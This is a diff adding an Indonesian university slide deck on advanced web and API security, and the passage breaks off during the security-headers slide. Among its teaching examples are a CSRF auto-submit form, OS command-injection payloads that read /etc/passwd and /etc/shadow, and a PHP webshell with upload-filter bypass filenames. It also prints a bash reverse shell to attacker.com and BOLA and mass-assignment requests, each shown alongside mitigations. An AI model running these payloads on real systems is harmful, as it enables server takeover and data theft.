@@ -1,0 +1,1030 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pertemuan 10 – Keamanan Web Lanjutan & API Security | RKS222 PSSN</title>
+<style>
+  :root {
+    --pssn-blue: #0d2b6b;
+    --pssn-darkblue: #081a45;
+    --pssn-gold: #e8a020;
+    --pssn-lightgold: #ffd166;
+    --bg-light: #f0f4f8;
+    --text-dark: #1a1a2e;
+    --shadow: 0 4px 20px rgba(0,0,0,0.12);
+    --radius: 12px;
+    --accent-green: #27ae60;
+    --accent-orange: #e67e22;
+    --accent-purple: #8e44ad;
+    --accent-red: #e74c3c;
+    --accent-teal: #16a085;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg-light); color: var(--text-dark); overflow: hidden; height: 100vh; width: 100vw; }
+  #slideshow { width: 100%; height: 100vh; position: relative; }
+  .slide { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; opacity: 0; pointer-events: none; transition: opacity 0.45s ease; overflow-y: auto; }
+  .slide.active { opacity: 1; pointer-events: all; }
+  #navbar { position: fixed; bottom: 0; left: 0; right: 0; z-index: 999; background: var(--pssn-darkblue); display: flex; align-items: center; justify-content: space-between; padding: 10px 24px; gap: 12px; box-shadow: 0 -2px 12px rgba(0,0,0,0.3); }
+  .nav-btn { background: var(--pssn-gold); color: var(--pssn-darkblue); border: none; border-radius: 8px; padding: 8px 22px; font-weight: 700; font-size: 14px; cursor: pointer; transition: background 0.2s, transform 0.1s; }
+  .nav-btn:hover { background: var(--pssn-lightgold); transform: translateY(-1px); }
+  .nav-btn:disabled { background: #555; color: #aaa; cursor: not-allowed; transform: none; }
+  #slide-counter { color: #aaa; font-size: 13px; min-width: 90px; text-align: center; }
+  #progress-bar { flex: 1; height: 6px; background: #333; border-radius: 3px; overflow: hidden; }
+  #progress-fill { height: 100%; background: var(--pssn-gold); border-radius: 3px; transition: width 0.4s ease; }
+  #slide-title-bar { color: #ccc; font-size: 12px; flex: 1.5; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+  .section-label { display: inline-block; background: var(--pssn-gold); color: var(--pssn-darkblue); font-weight: 800; font-size: 11px; letter-spacing: 1.5px; padding: 4px 12px; border-radius: 20px; text-transform: uppercase; margin-bottom: 12px; }
+  .slide-header { background: var(--pssn-blue); padding: 28px 48px 22px; color: white; flex-shrink: 0; }
+  .slide-header h2 { font-size: 22px; font-weight: 800; margin-bottom: 4px; }
+  .slide-header p { font-size: 14px; color: rgba(255,255,255,0.7); }
+  .slide-body { padding: 28px 48px 100px; flex: 1; }
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+  .three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+  .mt8{margin-top:8px;} .mt12{margin-top:12px;} .mt16{margin-top:16px;} .mt20{margin-top:20px;}
+
+  .card { background: #fff; border-radius: var(--radius); padding: 18px 20px; box-shadow: var(--shadow); }
+  .card h3 { font-size: 15px; font-weight: 700; margin-bottom: 10px; }
+  .card p, .card li { font-size: 13.5px; line-height: 1.7; color: #444; }
+  .card ul { padding-left: 18px; } .card ul li { margin-bottom: 4px; }
+
+  .cp-box { background: #fff; border-radius: var(--radius); padding: 16px 20px; box-shadow: var(--shadow); margin-bottom: 14px; border-left: 5px solid var(--pssn-blue); }
+  .cp-box h3 { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #888; margin-bottom: 5px; }
+  .cp-box p { font-size: 14px; font-weight: 600; color: var(--pssn-blue); line-height: 1.5; }
+
+  .indikator-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 4px; }
+  .indikator-card { background: #fff; border-radius: var(--radius); padding: 14px 16px; box-shadow: var(--shadow); display: flex; gap: 12px; align-items: flex-start; border-top: 3px solid; }
+  .ind-letter { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 14px; flex-shrink: 0; color: white; }
+  .ind-text { font-size: 13px; color: #333; line-height: 1.5; font-weight: 500; }
+  .ind-bloom { font-size: 11px; color: #888; margin-top: 3px; }
+
+  #s0 { background: linear-gradient(135deg, #1a3a8f 0%, #0d2b6b 40%, #7b1fa2 100%); justify-content: center; align-items: center; text-align: center; position: relative; padding: 40px; }
+  #s0::before { content: ''; position: absolute; inset: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/svg%3E"); }
+  .cover-badge { background: rgba(232,160,32,0.2); border: 1px solid var(--pssn-gold); color: var(--pssn-gold); border-radius: 20px; padding: 6px 18px; font-size: 13px; font-weight: 600; letter-spacing: 1px; margin-bottom: 24px; display: inline-block; }
+  .cover-title { color: white; font-size: 36px; font-weight: 800; line-height: 1.2; margin-bottom: 10px; text-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+  .cover-subtitle { color: var(--pssn-lightgold); font-size: 20px; font-weight: 600; margin-bottom: 6px; }
+  .cover-meta { color: rgba(255,255,255,0.7); font-size: 14px; margin-bottom: 36px; }
+  .cover-divider { width: 80px; height: 3px; background: var(--pssn-gold); border-radius: 2px; margin: 24px auto; }
+  .cover-pills { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-top: 8px; }
+  .cover-pill { background: rgba(255,255,255,0.12); color: white; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; padding: 8px 16px; font-size: 13px; }
+  .cover-pill strong { color: var(--pssn-gold); }
+  .cover-inst { color: rgba(255,255,255,0.6); font-size: 13px; margin-top: 32px; }
+
+  .code-block { background: #1e1e2e; color: #cdd6f4; border-radius: 8px; padding: 14px 16px; font-family: 'Courier New', monospace; font-size: 12.5px; line-height: 1.6; margin: 10px 0; overflow-x: auto; }
+  .code-block .cmd { color: #a6e3a1; }
+  .code-block .comment { color: #6c7086; font-style: italic; }
+  .code-block .kw { color: #cba6f7; }
+  .code-block .str { color: #fab387; }
+  .code-block .out { color: #89dceb; }
+
+  .info-box { background: #e3f2fd; border-left: 4px solid var(--pssn-blue); border-radius: 8px; padding: 12px 16px; }
+  .info-box p, .info-box li { font-size: 12.5px; color: #333; line-height: 1.6; }
+  .tip-box { background: linear-gradient(135deg,#fff8e1,#fffde7); border-left: 4px solid var(--pssn-gold); border-radius: 8px; padding: 12px 16px; }
+  .tip-box .tip-label { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--accent-orange); margin-bottom: 4px; }
+  .tip-box p, .tip-box li { font-size: 12.5px; color: #555; line-height: 1.6; }
+  .warn-box { background: #ffebee; border-left: 4px solid var(--accent-red); border-radius: 8px; padding: 12px 16px; }
+  .warn-box .warn-label { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--accent-red); margin-bottom: 4px; }
+  .warn-box p { font-size: 12.5px; color: #555; line-height: 1.6; }
+
+  .tag-row { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 10px; }
+  .tag { background: #e8eaf6; color: #3949ab; font-size: 11.5px; font-weight: 600; border-radius: 6px; padding: 4px 10px; }
+  .tag.green { background: #e8f5e9; color: #2e7d32; }
+  .tag.red { background: #ffebee; color: #c62828; }
+  .tag.gold { background: #fff8e1; color: #e65100; }
+  .tag.teal { background: #e0f7fa; color: #00695c; }
+  .tag.purple { background: #f3e5f5; color: #6a1b9a; }
+  .tag-red    { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #fdedec; color: #c0392b; }
+  .tag-orange { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #fef9e7; color: #d35400; }
+  .tag-blue   { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #e8f4fd; color: #1a4a6b; }
+  .tag-green  { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #eafaf1; color: #145a32; }
+  .tag-purple { display: inline-block; border-radius: 4px; padding: 2px 8px; font-size: 11px; font-weight: 700; background: #f5eef8; color: #7d3c98; }
+
+  h3.section-h { font-size: 16px; font-weight: 700; color: var(--pssn-blue); margin-bottom: 12px; margin-top: 18px; }
+  h3.section-h:first-child { margin-top: 0; }
+  .vuln-box { background: #fff; border-radius: var(--radius); padding: 16px 20px; box-shadow: var(--shadow); border-left: 5px solid; margin-bottom: 12px; }
+  .vuln-box h4 { font-size: 13px; font-weight: 800; margin-bottom: 6px; }
+  .vuln-box p, .vuln-box li { font-size: 12.5px; color: #444; line-height: 1.6; }
+  .vuln-box ul { padding-left: 16px; }
+
+  .step-flow { display: flex; gap: 0; align-items: stretch; margin: 14px 0; }
+  .step-item { flex: 1; min-width: 90px; background: #fff; border-radius: 8px; padding: 14px 10px; text-align: center; box-shadow: var(--shadow); position: relative; }
+  .step-item:not(:last-child)::after { content: '→'; position: absolute; right: -16px; top: 50%; transform: translateY(-50%); font-size: 18px; color: var(--pssn-gold); font-weight: 900; z-index: 1; }
+  .step-item + .step-item { margin-left: 22px; }
+  .step-num { width: 28px; height: 28px; border-radius: 50%; background: var(--pssn-blue); color: white; font-weight: 800; font-size: 13px; display: flex; align-items: center; justify-content: center; margin: 0 auto 8px; }
+  .step-item h5 { font-size: 12px; font-weight: 700; color: var(--pssn-blue); margin-bottom: 4px; }
+  .step-item p { font-size: 11px; color: #666; line-height: 1.4; }
+
+  .task-card { background: #fff; border-radius: var(--radius); padding: 20px 24px; box-shadow: var(--shadow); margin-bottom: 14px; border-left: 5px solid; }
+  .task-card h4 { font-size: 15px; font-weight: 800; margin-bottom: 8px; }
+  .task-card p, .task-card li { font-size: 13.5px; color: #444; line-height: 1.7; }
+  .task-card ul { padding-left: 18px; margin-top: 6px; }
+  .task-meta { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 10px; }
+  .task-badge { font-size: 11px; font-weight: 700; padding: 3px 10px; border-radius: 12px; }
+  .tb-red{background:#ffebee;color:#c62828;} .tb-blue{background:#e3f2fd;color:#1565c0;}
+  .tb-green{background:#e8f5e9;color:#2e7d32;} .tb-gold{background:#fff8e1;color:#e65100;}
+  .tb-teal{background:#e0f7fa;color:#00695c;}
+
+  .quiz-container { max-width: 720px; margin: 0 auto; }
+  .q-num { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--pssn-gold); margin-bottom: 6px; }
+  .q-text { font-size: 15px; font-weight: 600; color: var(--pssn-blue); margin-bottom: 14px; line-height: 1.5; }
+  .q-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 8px; }
+  .q-option { background: #fff; border: 2px solid #e0e0e0; border-radius: 10px; padding: 12px 16px; cursor: pointer; transition: all 0.2s; font-size: 13.5px; color: #333; font-weight: 500; text-align: left; }
+  .q-option:hover { border-color: var(--pssn-blue); background: #f0f4ff; }
+  .q-option.correct { border-color: #4caf50; background: #e8f5e9; color: #2e7d32; font-weight: 700; }
+  .q-option.wrong { border-color: #ef5350; background: #ffebee; color: #c62828; }
+  .q-feedback { font-size: 13px; padding: 10px 14px; border-radius: 8px; margin-top: 8px; display: none; line-height: 1.6; }
+  .q-feedback.show { display: block; }
+  .q-feedback.ok { background: #e8f5e9; color: #2e7d32; border-left: 3px solid #4caf50; }
+  .q-feedback.ko { background: #ffebee; color: #c62828; border-left: 3px solid #ef5350; }
+  .quiz-score { text-align: center; background: var(--pssn-blue); color: white; border-radius: var(--radius); padding: 16px; margin-top: 16px; display: none; }
+  .quiz-score h3 { font-size: 22px; font-weight: 900; color: var(--pssn-gold); }
+  .quiz-score p { font-size: 14px; color: rgba(255,255,255,0.8); margin-top: 4px; }
+  .quiz-nav { display: flex; gap: 10px; margin-top: 12px; justify-content: center; }
+  .quiz-btn { background: var(--pssn-blue); color: white; border: none; border-radius: 8px; padding: 10px 24px; font-weight: 700; font-size: 13px; cursor: pointer; transition: background 0.2s; }
+  .quiz-btn:hover { background: #1a3a8f; }
+
+  .ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+  .ref-card { background: #fff; border-radius: var(--radius); padding: 16px 18px; box-shadow: var(--shadow); border-top: 3px solid; }
+  .ref-card h4 { font-size: 13px; font-weight: 800; margin-bottom: 8px; }
+  .ref-card li { font-size: 12.5px; color: #444; line-height: 1.8; }
+  .ref-card ul { padding-left: 16px; }
+
+  .cmp-table { width: 100%; border-collapse: collapse; font-size: 12.5px; margin-top: 10px; }
+  .cmp-table th { background: var(--pssn-blue); color: white; padding: 8px 12px; text-align: left; font-size: 12px; }
+  .cmp-table td { padding: 8px 12px; border-bottom: 1px solid #e0e0e0; color: #444; line-height: 1.5; }
+  .cmp-table tr:nth-child(even) { background: #f8f9ff; }
+  .cmp-table td:first-child { font-weight: 700; color: var(--pssn-blue); }
+</style>
+</head>
+<body>
+<div id="slideshow">
+
+<!-- SLIDE 0: COVER -->
+<div class="slide active" id="s0" data-title="Cover">
+  <div style="position:relative;z-index:1;text-align:center;max-width:820px;margin:auto;">
+    <div class="cover-badge">RKS222 • Keamanan Perangkat Lunak • Semester 4</div>
+    <div class="cover-title">Keamanan Web Lanjutan<br>& API Security</div>
+    <div class="cover-subtitle">CSRF, OWASP API Top 10, Security Headers & File Upload Attack</div>
+    <div class="cover-meta">Sub-CPMK 263.1 & 263.2 &nbsp;|&nbsp; Pertemuan 10 &nbsp;|&nbsp; Bobot 15%</div>
+    <div class="cover-divider"></div>
+    <div class="cover-pills">
+      <div class="cover-pill"><strong>Topik:</strong> CSRF & Command Injection</div>
+      <div class="cover-pill"><strong>Topik:</strong> OWASP API Security Top 10</div>
+      <div class="cover-pill"><strong>Topik:</strong> Security Headers & CSP</div>
+      <div class="cover-pill"><strong>Tools:</strong> Burp Suite · Postman · DVWA</div>
+    </div>
+    <div class="cover-inst">Program Studi Rekayasa Keamanan Siber — Politeknik SSN</div>
+  </div>
+</div>
+
+<!-- SLIDE 1: CAPAIAN PEMBELAJARAN -->
+<div class="slide" id="s1" data-title="Capaian Pembelajaran">
+  <div class="slide-header">
+    <div class="section-label">Capaian Pembelajaran</div>
+    <h2>Capaian Pembelajaran Pertemuan 10</h2>
+    <p>Sub-CPMK 263.1 & 263.2 | CPMK263 | CPL02 — RKS222, PSSN</p>
+  </div>
+  <div class="slide-body">
+    <div class="cp-box">
+      <h3>Sub-CPMK 263.1 — Lanjutan</h3>
+      <p>Mahasiswa mampu menganalisis kerentanan web lanjutan (CSRF, Command Injection, File Upload) serta mengimplementasikan security headers sebagai lapisan pertahanan defense-in-depth.</p>
+    </div>
+    <div class="cp-box">
+      <h3>Sub-CPMK 263.2 — Inti</h3>
+      <p>Mahasiswa mampu mengidentifikasi dan menguji kerentanan pada API modern (REST/GraphQL) berdasarkan OWASP API Security Top 10 2023, serta mendokumentasikan temuan dalam laporan pengujian API.</p>
+    </div>
+    <div class="indikator-grid mt12">
+      <div class="indikator-card" style="border-top-color:#e74c3c;">
+        <div class="ind-letter" style="background:#e74c3c;">A</div>
+        <div>
+          <div class="ind-text">Menjelaskan mekanisme CSRF dan mengimplementasikan serangan CSRF serta countermeasure (token, SameSite, Referer check)</div>
+          <div class="ind-bloom">Bloom C3 — Menerapkan</div>
+        </div>
+      </div>
+      <div class="indikator-card" style="border-top-color:#e67e22;">
+        <div class="ind-letter" style="background:#e67e22;">B</div>
+        <div>
+          <div class="ind-text">Menganalisis kerentanan File Upload dan Command Injection serta dampak Remote Code Execution yang dapat ditimbulkan</div>
+          <div class="ind-bloom">Bloom C4 — Menganalisis</div>
+        </div>
+      </div>
+      <div class="indikator-card" style="border-top-color:#2980b9;">
+        <div class="ind-letter" style="background:#2980b9;">C</div>
+        <div>
+          <div class="ind-text">Mengklasifikasikan kerentanan API berdasarkan OWASP API Security Top 10 2023 dan mendemonstrasikan pengujian API dengan Postman dan Burp Suite</div>
+          <div class="ind-bloom">Bloom C3 — Menerapkan</div>
+        </div>
+      </div>
+      <div class="indikator-card" style="border-top-color:#27ae60;">
+        <div class="ind-letter" style="background:#27ae60;">D</div>
+        <div>
+          <div class="ind-text">Mengkonfigurasi security headers (CSP, HSTS, X-Frame-Options) dan menganalisis dampaknya terhadap mitigasi XSS dan clickjacking</div>
+          <div class="ind-bloom">Bloom C5 — Mengevaluasi</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 2: REVIEW & PETA MATERI -->
+<div class="slide" id="s2" data-title="Review & Peta Materi">
+  <div class="slide-header">
+    <div class="section-label">Orientasi</div>
+    <h2>Review Pertemuan 9 & Agenda Hari Ini</h2>
+    <p>Dari SQLi/XSS/BAC → CSRF, Command Injection, API Security, Security Headers</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Review Pertemuan 9</h3>
+        <div style="background:#fdedec;border-left:4px solid #c0392b;border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+          <strong>A01 Broken Access Control:</strong> IDOR — ubah ID parameter untuk akses data orang lain
+        </div>
+        <div style="background:#fef9e7;border-left:4px solid #e67e22;border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+          <strong>A03 SQL Injection:</strong> In-band, Blind (Boolean/Time), dump dengan SQLMap
+        </div>
+        <div style="background:#f5eef8;border-left:4px solid #8e44ad;border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+          <strong>XSS:</strong> Reflected, Stored, DOM — cookie theft, bypass filter dengan event handlers
+        </div>
+        <div style="background:#e8f5e9;border-left:4px solid #27ae60;border-radius:8px;padding:12px 16px;">
+          <strong>A07 Auth Failures:</strong> Brute force, credential stuffing, JWT algorithm confusion
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Agenda Pertemuan 10</h3>
+        <div style="background:#fdedec;border-left:4px solid #c0392b;border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+          <strong>Blok 1:</strong> CSRF — mekanisme, eksploitasi, token vs SameSite cookie
+        </div>
+        <div style="background:#fef9e7;border-left:4px solid #e67e22;border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+          <strong>Blok 2:</strong> Command Injection & File Upload — Path ke RCE
+        </div>
+        <div style="background:#e8f4fd;border-left:4px solid #2980b9;border-radius:8px;padding:12px 16px;margin-bottom:8px;">
+          <strong>Blok 3:</strong> OWASP API Security Top 10 2023 — API-specific vulnerabilities
+        </div>
+        <div style="background:#e8f5e9;border-left:4px solid #27ae60;border-radius:8px;padding:12px 16px;">
+          <strong>Blok 4:</strong> Security Headers — CSP, HSTS, X-Frame-Options, CORS
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 3: CSRF -->
+<div class="slide" id="s3" data-title="CSRF — Cross-Site Request Forgery">
+  <div class="slide-header">
+    <div class="section-label">CSRF</div>
+    <h2>Cross-Site Request Forgery (CSRF)</h2>
+    <p>Memaksa browser korban mengirimkan request berbahaya ke server yang dipercaya atas nama korban | CWE-352</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Mekanisme Serangan CSRF</h3>
+        <div class="vuln-box" style="border-left-color:#c0392b;">
+          <h4 style="color:#c0392b;">Alur Serangan CSRF</h4>
+          <p style="font-size:12.5px;line-height:1.9;">
+            1. Korban login ke <strong>bank.com</strong> → browser simpan session cookie<br>
+            2. Korban mengunjungi <strong>evil.com</strong> (link dari email/chat)<br>
+            3. evil.com muat halaman dengan tag hidden:<br>
+            <code style="font-size:11px;background:#f5f5f5;padding:2px 6px;border-radius:3px;">&lt;img src="https://bank.com/transfer?to=hacker&amount=9999999"&gt;</code><br>
+            4. Browser korban secara otomatis kirim request ke bank.com <strong>beserta cookie</strong><br>
+            5. Bank.com proses transaksi karena request tampak sah!
+          </p>
+        </div>
+        <div class="code-block" style="margin-top:10px;">
+<span class="comment">&lt;!-- CSRF HTML Form Attack (evil.com) --&gt;</span>
+<span class="kw">&lt;form</span> action=<span class="str">"https://target.com/change-email"</span>
+      method=<span class="str">"POST"</span> id=<span class="str">"csrf-form"</span>&gt;
+  <span class="kw">&lt;input</span> type=<span class="str">"hidden"</span> name=<span class="str">"email"</span>
+         value=<span class="str">"hacker@evil.com"</span>&gt;
+<span class="kw">&lt;/form&gt;</span>
+<span class="kw">&lt;script&gt;</span>document.getElementById(<span class="str">'csrf-form'</span>).submit();<span class="kw">&lt;/script&gt;</span>
+<span class="comment">&lt;!-- Auto-submit saat halaman dimuat --&gt;</span>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Mitigasi CSRF</h3>
+        <div class="vuln-box" style="border-left-color:#27ae60;">
+          <h4 style="color:#1e8449;">1. CSRF Token (Synchronizer Token Pattern)</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment">// Server generate token unik per session/request</span>
+<span class="kw">$token</span> = bin2hex(random_bytes(32));
+<span class="kw">$_SESSION</span>[<span class="str">'csrf_token'</span>] = <span class="kw">$token</span>;
+
+<span class="comment">&lt;!-- Embed di form --&gt;</span>
+<span class="kw">&lt;input</span> type=<span class="str">"hidden"</span> name=<span class="str">"csrf_token"</span>
+       value=<span class="str">"&lt;?php echo $token; ?&gt;"</span>&gt;
+<span class="comment">// Server validasi token di setiap POST request</span>
+          </div>
+        </div>
+        <div class="vuln-box mt8" style="border-left-color:#2980b9;">
+          <h4 style="color:#1a5276;">2. SameSite Cookie Attribute</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># Set-Cookie dengan SameSite=Strict atau Lax</span>
+<span class="out">Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly</span>
+<span class="comment"># Strict: cookie tidak dikirim dari situs lain
+# Lax: izinkan top-level navigation GET saja</span>
+          </div>
+        </div>
+        <div class="tip-box mt8">
+          <div class="tip-label">Double Submit Cookie Pattern</div>
+          <p>Kirim nilai CSRF token sebagai cookie DAN di body request. Server memverifikasi keduanya cocok. Efektif tanpa state server-side.</p>
+        </div>
+        <div class="tag-row">
+          <span class="tag red">CWE-352</span>
+          <span class="tag gold">OWASP CSRF Prevention CS</span>
+          <span class="tag">NICE K0119</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 4: COMMAND INJECTION & FILE UPLOAD -->
+<div class="slide" id="s4" data-title="Command Injection & File Upload RCE">
+  <div class="slide-header">
+    <div class="section-label">Injection Lanjutan</div>
+    <h2>Command Injection & Unrestricted File Upload</h2>
+    <p>Dua jalur menuju Remote Code Execution (RCE) yang paling merusak | CWE-77, CWE-434</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">OS Command Injection</h3>
+        <div class="vuln-box" style="border-left-color:#c0392b;">
+          <h4 style="color:#c0392b;">Mekanisme & Payload</h4>
+          <p>Aplikasi memasukkan input pengguna langsung ke perintah sistem OS:</p>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># Kode PHP rentan (ping tool):</span>
+<span class="kw">$ip</span> = <span class="kw">$_GET</span>[<span class="str">'ip'</span>];
+<span class="kw">system</span>(<span class="str">"ping -c 4 $ip"</span>);
+
+<span class="comment"># Input attacker — command chaining:</span>
+<span class="out">127.0.0.1; id               ← semicolon chain
+127.0.0.1 && cat /etc/passwd ← AND chain
+127.0.0.1 | whoami           ← pipe chain
+127.0.0.1 `id`               ← backtick
+127.0.0.1 $(cat /etc/shadow) ← subshell</span>
+          </div>
+        </div>
+        <div class="warn-box mt8">
+          <div class="warn-label">Dampak RCE via Command Injection</div>
+          <p>Akses shell penuh pada server • Baca file sensitif (/etc/passwd, .env) • Pivoting ke sistem internal • Reverse shell ke attacker • Cryptomining • Ransomware deployment</p>
+        </div>
+        <div class="tip-box mt8">
+          <div class="tip-label">Mitigasi Command Injection</div>
+          <p>Hindari pemanggilan shell langsung — gunakan library API. Jika tak bisa dihindari: whitelist input (hanya angka untuk IP), escapeshellarg(), atau sandboxing.</p>
+        </div>
+      </div>
+      <div>
+        <h3 class="section-h">Unrestricted File Upload → RCE</h3>
+        <div class="vuln-box" style="border-left-color:#e67e22;">
+          <h4 style="color:#d35400;">Attack Chain: Upload → Webshell → RCE</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># 1. Buat webshell PHP sederhana</span>
+<span class="comment"># File: shell.php</span>
+<span class="out">&lt;?php system($_GET['cmd']); ?&gt;</span>
+
+<span class="comment"># 2. Upload ke aplikasi (bypass filter)</span>
+<span class="out">shell.php     ← tanpa filter
+shell.php.jpg ← MIME check lemah
+shell.pHp     ← case mismatch
+shell.php%00.jpg ← null byte (PHP lama)</span>
+
+<span class="comment"># 3. Akses webshell via browser/curl</span>
+<span class="cmd">curl "http://target.com/uploads/shell.php?cmd=id"</span>
+<span class="out">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="comment"># 4. Upgrade ke reverse shell</span>
+<span class="out">cmd=bash -c 'bash -i >&amp; /dev/tcp/attacker.com/4444 0>&amp;1'</span>
+          </div>
+        </div>
+        <div class="info-box mt8">
+          <p><strong>Mitigasi File Upload:</strong> Validasi MIME type server-side (bukan hanya extension) • Simpan di luar web root • Random filename • Antivirus scan • Nonaktifkan eksekusi di folder upload</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 5: OWASP API SECURITY TOP 10 -->
+<div class="slide" id="s5" data-title="OWASP API Security Top 10">
+  <div class="slide-header">
+    <div class="section-label">API Security</div>
+    <h2>OWASP API Security Top 10 2023</h2>
+    <p>Kerentanan spesifik pada REST API, GraphQL, dan microservices — Sub-CPMK 263.2</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">API Security Top 10 Overview</h3>
+        <table class="cmp-table">
+          <thead><tr><th>ID</th><th>Kategori</th><th>Contoh</th></tr></thead>
+          <tbody>
+            <tr><td>API1</td><td>Broken Object Level Authorization</td><td>IDOR di /api/orders/{id}</td></tr>
+            <tr><td>API2</td><td>Broken Authentication</td><td>JWT tanpa expiry, no rate limit</td></tr>
+            <tr><td>API3</td><td>Broken Object Property Level Auth</td><td>Mass assignment — set role lewat API</td></tr>
+            <tr><td>API4</td><td>Unrestricted Resource Consumption</td><td>Tidak ada rate limit, DoS mudah</td></tr>
+            <tr><td>API5</td><td>Broken Function Level Authorization</td><td>User akses endpoint admin</td></tr>
+            <tr><td>API6</td><td>Unrestricted Access to Sensitive Business Flows</td><td>Abuse promo code tanpa limit</td></tr>
+            <tr><td>API7</td><td>Server-Side Request Forgery</td><td>API fetch URL dari input user</td></tr>
+            <tr><td>API8</td><td>Security Misconfiguration</td><td>CORS *, debug mode aktif</td></tr>
+            <tr><td>API9</td><td>Improper Inventory Management</td><td>API v1 deprecated tapi masih aktif</td></tr>
+            <tr><td>API10</td><td>Unsafe Consumption of APIs</td><td>Trust third-party API tanpa validasi</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div>
+        <h3 class="section-h">API1 — Broken Object Level Authorization</h3>
+        <div class="vuln-box" style="border-left-color:#c0392b;">
+          <h4 style="color:#c0392b;">BOLA — API Equivalent of IDOR</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># Authenticated sebagai user A</span>
+<span class="cmd">GET /api/v1/accounts/1001/transactions</span>
+<span class="out">Authorization: Bearer [token-user-A]
+→ 200 OK, data transaksi user A</span>
+
+<span class="comment"># Manipulasi ID → akses akun user B</span>
+<span class="cmd">GET /api/v1/accounts/1002/transactions</span>
+<span class="out">Authorization: Bearer [token-user-A]
+→ 200 OK ← BOLA ditemukan! Harus 403!</span>
+          </div>
+        </div>
+        <div class="vuln-box mt8" style="border-left-color:#8e44ad;">
+          <h4 style="color:#7d3c98;">API3 — Mass Assignment Attack</h4>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># POST /api/users/register — payload normal:</span>
+<span class="out">{"username":"alice","password":"pass123"}</span>
+
+<span class="comment"># Mass assignment attack — tambahkan field admin:</span>
+<span class="out">{"username":"alice","password":"pass123","role":"admin","isVerified":true}</span>
+<span class="comment"># Jika server tidak filter → user langsung jadi admin!</span>
+          </div>
+        </div>
+        <div class="tip-box mt8">
+          <div class="tip-label">Pengujian API dengan Postman + Burp</div>
+          <p>Export collection Postman → import ke Burp Scanner. Systematic enumerate semua endpoint, ubah parameter ID, tambahkan field berbeda, uji authorization across user roles.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 6: SECURITY HEADERS -->
+<div class="slide" id="s6" data-title="Security Headers — CSP, HSTS, X-Frame-Options">
+  <div class="slide-header">
+    <div class="section-label">Defense in Depth</div>
+    <h2>Security Headers — Lapisan Pertahanan di HTTP Response</h2>
+    <p>HTTP response headers yang memperkuat keamanan browser dan mencegah serangan sisi klien</p>
+  </div>
+  <div class="slide-body">
+    <div class="two-col">
+      <div>
+        <h3 class="section-h">Header Keamanan Penting</h3>
+        <div class="vuln-box" style="border-left-color:#2980b9;">
+          <h4 style="color:#1a5276;">Content-Security-Policy (CSP)</h4>
+          <p>Mencegah XSS dengan membatasi sumber script, style, image yang boleh dimuat:</p>
+          <div class="code-block" style="margin-top:6px;">
+<span class="comment"># Contoh CSP ketat — blokir inline script + external</span>
+<span class="out">Content-Security-Policy:
